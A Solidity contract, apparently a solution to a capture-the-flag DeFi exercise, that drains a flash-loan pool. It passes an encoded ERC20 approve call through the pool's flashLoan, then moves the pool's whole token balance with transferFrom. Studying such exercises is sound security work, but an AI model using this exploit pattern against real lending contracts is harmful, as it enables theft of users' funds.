// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    function takePool(
        address borrower,
        address poolAddress,
        address tokenAddress
    ) public {
        IERC20 token = IERC20(tokenAddress);

        TrusterLenderPool pool = TrusterLenderPool(poolAddress);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            uint256(token.balanceOf(poolAddress))
        );

        pool.flashLoan(0, borrower, tokenAddress, data);

        token.transferFrom(poolAddress, borrower, token.balanceOf(poolAddress));
    }
}
